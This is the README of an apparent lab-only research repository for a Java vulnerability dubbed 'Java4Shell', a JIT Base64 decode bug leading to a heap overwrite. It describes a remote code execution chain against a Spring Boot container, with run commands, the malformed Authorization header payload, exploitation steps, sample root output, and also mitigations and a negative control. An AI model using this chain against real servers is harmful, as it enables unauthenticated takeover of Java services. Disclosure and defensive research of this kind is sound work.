# java4shell

**Personal research.** This is independent, self-directed study of
CVE-2026-114938 carried out on hardware and containers I own. It is not
affiliated with, endorsed by, or derived from any employer, vendor, or
engagement. Everything here is lab-only: the targets are containers I built
for the purpose.

Working research lab for **CVE-2026-114938 ("Java4Shell")** — an integer
underflow in OpenJDK HotSpot's AVX-512 VBMI Base64 decode intrinsic that
produces a 62-byte heap out-of-bounds write.

This repo contains a **verified remote code execution chain** against a Spring
Boot target, with the negative control that proves the exploit depends on the
vulnerable intrinsic.

## Quick start

```powershell
# 1. start the vulnerable lab (JDK 21.0.13, Spring Boot, port 18080)
cd lab\spring
docker compose up -d
curl http://127.0.0.1:18080/health

# 2. run the chain
cd ..\..
python java4shell.py
```

Expected:

```
[0] baseline: unauthenticated request
    status=200 body='denied: privilege=user'
[0] warm 25000/25000 decodes in 133.5s (187 rps)
[0] trigger status=200 'admin: privilege=admin'

=== RCE CONFIRMED ===
server process executed: id; uname -a
admin: privilege=admin
--- output ---
uid=0(root) gid=0(root) groups=0(root)
```

Tear down with `docker compose down` in `lab\spring`.

## The chain

An unauthenticated request carrying `Authorization: Basic AAAA…A=` (64 `A`
followed by `=`) executes a command in the server process. Nothing runs
locally; the server runs the command.

1. **WARM** — ~20 000 valid decodes so C2 compiles the AVX-512 intrinsic.
2. **TRIGGER** — one malformed Basic header. The padded tail makes
   `output_size = -1`; `bzhiq` reads the low byte (`0xFF`) and clears no bits,
   so the resulting full mask turns `evmovdqub` into a 64-byte store at output
   offset 48 — 62 bytes past the 65-byte buffer.
3. **PROMOTE** — the application allocates its decode buffer and a per-request
   authority object back to back (`gap = 88`), then decodes. The spill lands on
   the authority's mark word, klass pointer and `admin` byte. `0x9a` is
   non-zero, and reading an instance field does not dereference klass, so the
   privilege gate opens.
4. **EXECUTE** — the promoted request reaches the application's command runner.

**Allocation order is load-bearing.** If the decode happens before the
authority object is allocated, the decoder's internal allocations push the
target from `+88` to `+816` and the spill misses.

## Evidence it is the bug

| Instance | JVM flag | Result |
|---|---|---|
| `j4s-spring` | *(none)* | `admin: privilege=admin` — RCE |
| `j4s-mitigated` | `-XX:-UseBASE64Intrinsics` | `denied`, 3/3 attempts |

Same image, same app, same bytes on the wire. Reproduce the control:

```powershell
docker run -d --name j4s-mitigated --entrypoint java -p 127.0.0.1:18081:8080 `
  j4s-spring-lab:local -XX:-UseBASE64Intrinsics -XX:+UseG1GC -jar /app/app.jar

python java4shell.py --base-url http://127.0.0.1:18081 --attempts 3
```

> The `--entrypoint java` matters. Without it the image's `ENTRYPOINT` swallows
> the flag as application arguments and the JVM never sees it — which produces
> a false "success".

## The one-shot property

The trigger is effectively **one-shot per compiled intrinsic**. After the
decode throws `IllegalArgumentException`, `decode0`/`decodeBlock` go
*"made not entrant"* and are deoptimized; they must be recompiled by a fresh
warm window before another landing is possible.

```
phase1 (no re-warm): attempt 0 landed, attempts 1-19 did not   -> 1/20
phase2 (re-warm 50k before each):                              -> 7/8
```

This is why a driver that warms once and then fires hundreds of triggers only
ever lands once. `java4shell.py` warms before every attempt.

Verify it:

```powershell
docker exec j4s-spring sh -c "cd /tmp && java -XX:+PrintCompilation -cp /tmp OneShotTheory 2>&1 | grep -E 'decode0|made not entrant' | head"
```

## Layout

| Path | Purpose |
|---|---|
| `java4shell.py` | **working RCE chain** (the thing to run) |
| `Base64Trigger.java` | bounded standalone proof (`REPRODUCED`) |
| `lab\spring\` | vulnerable Spring Boot target + Dockerfile |
| `lab\research\` | measurement code backing every claim |
| `archive\` | superseded files, kept for reference |
| `field-notes.md` | observations from validating the primitive |

Measurement code in `lab\research\`:

| File | Question it answers |
|---|---|
| `OneShotTheory.java` | is the trigger one-shot? (yes, measured) |
| `RemoteChain2.java` | does the spill reach a neighbouring object? (`AUTH_BYPASS`) |
| `Layout2.java` | real allocation distances (`88` pair, `816` after a decode) |
| `StoreTest.java` | plain stores through a corrupted array (`SIGSEGV`) |
| `Chain4.java` | writer → repair → reader → JavaBleed disclosure |
| `NoBugControl.java` | proves the old `RESULT=RCE_OK` was a false positive |
| `Trigger.java`, `Layout.java`, `Adjacency.java` | early geometry experiments |

## Preconditions

| Requirement | Value |
|---|---|
| JDK | 17.0.6–17.0.21, 21 < 21.0.13.1, 25 < 25.0.5.1, 27 < 27.0.1.1 |
| CPU | x86-64 with **all** of `avx512f`, `avx512bw`, `avx512vbmi`, `bmi2` |
| JIT | intrinsic must be C2-compiled (warm first) |
| Decoder | `Base64.getDecoder()` / `getUrlDecoder()` (MIME decoder unaffected) |

```sh
grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' |
  grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'
```

All four must be present. Without `avx512vbmi` the intrinsic is never emitted
and the trigger is a harmless no-op — but **no crash is not proof of safety**.

## Mitigation

Upgrade to 17.0.21.1 / 21.0.13.1 / 25.0.5.1 / 27.0.1.1, or run the JVM with:

```sh
-XX:-UseBASE64Intrinsics     # narrow, recommended interim
-XX:UseAVX=2                 # x86-64 only, broader
```

## Scope notes

- The toggle is app-specific. The chain works because this lab's endpoint
  allocates a 65-byte decode buffer immediately before a per-request authority
  object — a realistic but deliberately favourable shape. A different
  application needs its own profile; there is no universal payload.
- `archive/Java4ShellChain.java` prints `RESULT=RCE_OK` while doing no remote
  work. It sets a boolean on its own object and calls `ProcessBuilder` from its
  own `main`. `lab\research\NoBugControl.java` reproduces that output with the
  bug removed.

## Authorization

Use only on systems you are authorized to test. The trigger is a memory
corruption primitive and can crash the JVM (availability impact).
